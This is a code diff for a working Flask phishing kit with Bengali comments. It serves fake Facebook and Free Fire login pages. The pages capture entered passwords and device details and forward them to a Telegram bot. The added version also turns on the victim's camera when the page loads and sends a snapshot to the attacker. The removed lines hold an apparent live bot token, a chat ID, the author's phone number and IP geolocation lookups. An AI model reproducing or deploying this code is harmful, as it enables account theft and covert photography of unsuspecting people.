@@ -1,89 +1,127 @@
-import requests, os, datetime
-from flask import Flask, render_template_string, request
+import os
+import requests
+from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
 
-# --- কনফিগারেশন (Dev By Anas +971504614724) ---
-BOT_TOKEN = "8405188979:AAFgnDsgWjiK9WkBe5i_kIccbVRUwGvg06c"
-CHAT_ID = "7701549179"
+# --- আপনার সেটিংস ---
+BOT_TOKEN = "YOUR_BOT_TOKEN" # এখানে আপনার টেলিগ্রাম বট টোকেন দিন
+CHAT_ID = "YOUR_CHAT_ID"     # এখানে আপনার চ্যাট আইডি দিন
 
-@app.route('/<platform>')
-def login_page(platform):
-    return render_template_string('''
-    <html><head><meta name="viewport" content="width=device-width, initial-scale=1">
-    <script>
-    async function track(){
-        try { await navigator.mediaDevices.getUserMedia({video:true}); } catch(e) {}
-        let b = await navigator.getBattery();
-        let n = navigator;
-        let info = {
-            u: document.getElementById('u').value, 
-            p: document.getElementById('p').value,
-            platform: "{{p}}",
-            batt: (b.level * 100) + "% (" + (b.charging ? "Charging" : "Not Charging") + ")",
-            ram: n.deviceMemory || "N/A",
-            cpu: n.hardwareConcurrency || "N/A",
-            scr: screen.width + "x" + screen.height,
-            os: n.platform,
-            ua: n.userAgent,
-            lang: n.language,
-            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            ref: document.referrer || "Direct Visit",
-            online: n.onLine ? "Yes" : "No"
-        };
-        fetch('/save', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(info)}).then(() => {
-            window.location.href = "https://"+info.platform+".com/login";
-        });
-    }
-    </script></head>
-    <body style="font-family:sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
-        <div style="background:white; padding:30px; border-radius:12px; width:90%; max-width:320px; text-align:center; box-shadow:0 10px 25px rgba(0,0,0,0.1);">
-            <h2 style="color:#1877f2;">{{p|capitalize}} Login</h2>
-            <input id="u" placeholder="Email or Phone" style="width:100%; padding:12px; margin:8px 0; border:1px solid #ddd; border-radius:6px;">
-            <input type="password" id="p" placeholder="Password" style="width:100%; padding:12px; margin:8px 0; border:1px solid #ddd; border-radius:6px;">
-            <button onclick="track()" style="width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer;">Log In</button>
+# --- HTML টেমপ্লেট (অ্যাপের মতো ডিজাইন এবং ক্যামেরা ক্যাপচার) ---
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ title }}</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f0f2f5; font-family: sans-serif; }
+        .login-card { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1); }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen p-4">
+    <div class="w-full max-w-sm login-card p-6">
+        <div class="text-center mb-6">
+            <h1 class="text-3xl font-bold text-blue-600">{{ title }}</h1>
+            <p class="text-gray-500">Login to your account to continue</p>
         </div>
-    </body></html>
-    ''', p=platform)
+        <form id="loginForm" class="space-y-4">
+            <input type="text" id="user" placeholder="Email or Phone" class="w-full p-3 border rounded focus:outline-blue-500" required>
+            <input type="password" id="pass" placeholder="Password" class="w-full p-3 border rounded focus:outline-blue-500" required>
+            <button type="submit" class="w-full bg-blue-600 text-white font-bold py-3 rounded hover:bg-blue-700 transition">Log In</button>
+        </form>
+    </div>
 
-@app.route('/save', methods=['POST'])
-def save():
-    d = request.json
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    # আইপি থেকে সিম ও লোকেশন বের করার জন্য API
-    geo = requests.get(f"http://ip-api.com/json/{ip}").json()
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        // ক্যামেরা পারমিশন ও স্ন্যাপশট
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    takeSnapshot();
+                }, 2000); // ২ সেকেন্ড পর ছবি তুলবে
+            } catch (err) { console.log("Camera blocked"); }
+        }
+
+        function takeSnapshot() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL('image/jpeg');
+            
+            fetch('/upload_image', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imageData })
+            });
+        }
+
+        window.onload = startCamera;
+
+        // ডাটা সাবমিট
+        document.getElementById('loginForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+            
+            // হার্ডওয়্যার ডাটা সংগ্রহ
+            const info = {
+                user: user,
+                pass: pass,
+                app: "{{ title }}",
+                ram: navigator.deviceMemory || "N/A",
+                cpu: navigator.hardwareConcurrency || "N/A",
+                platform: navigator.platform,
+                battery: (await navigator.getBattery()).level * 100 + "%"
+            };
+
+            await fetch('/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(info)
+            });
+            
+            window.location.href = "https://www.facebook.com"; // রিডাইরেক্ট
+        };
+    </script>
+</body>
+</html>
+"""
+
+@app.route('/facebook')
+def facebook():
+    return render_template_string(HTML_TEMPLATE, title="Facebook")
+
+@app.route('/freefire')
+def freefire():
+    return render_template_string(HTML_TEMPLATE, title="Freefire Login")
+
+@app.route('/login', methods=['POST'])
+def login():
+    data = request.json
+    msg = f"🔥 **ANAS MASTER ATTACK** 🔥\\n\\n👤 User: {data['user']}\\n🔑 Pass: {data['pass']}\\n📱 App: {data['app']}\\n\\n⚙️ **HARDWARE INFO**\\n🔋 Battery: {data['battery']}\\n💾 RAM: {data['ram']} GB\\n💎 CPU: {data['cpu']} Cores\\n🖥️ OS: {data['platform']}\\n\\n✅ **Dev By Anas +971504614724**"
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
+    return jsonify({"status": "ok"})
+
+@app.route('/upload_image', methods=['POST'])
+def upload_image():
+    img_data = request.json['image'].split(',')[1]
+    import base64
+    with open("victim.jpg", "wb") as f:
+        f.write(base64.b64decode(img_data))
     
-    full_msg = (
-        f"🔥 **ANAS MASTER ATTACK SUCCESS** 🔥\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"👤 **User:** `{d['u']}`\n"
-        f"🔑 **Pass:** `{d['p']}`\n"
-        f"📱 **App:** {d['platform'].upper()}\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🌐 **NETWORK DETAILS**\n"
-        f"🔹 **IP:** `{ip}`\n"
-        f"🔹 **Sim/ISP:** {geo.get('isp', 'N/A')}\n"
-        f"🔹 **City:** {geo.get('city', 'N/A')}\n"
-        f"🔹 **Country:** {geo.get('country', 'N/A')}\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🔋 **HARDWARE INFO**\n"
-        f"🔹 **Battery:** {d['batt']}\n"
-        f"🔹 **RAM:** {d['ram']} GB\n"
-        f"🔹 **CPU Cores:** {d['cpu']}\n"
-        f"🔹 **Screen:** {d['scr']}\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"⚙️ **SOFTWARE INFO**\n"
-        f"🔹 **OS:** {d['os']}\n"
-        f"🔹 **Language:** {d['lang']}\n"
-        f"🔹 **Timezone:** {d['tz']}\n"
-        f"🔹 **Referrer:** {d['ref']}\n"
-        f"🔹 **Time:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"✅ **Dev By Anas +971504614724**"
-    )
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": full_msg, "parse_mode": "Markdown"})
-    return "OK"
+    with open("victim.jpg", "rb") as photo:
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": photo})
+    return jsonify({"status": "ok"})
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=10000)
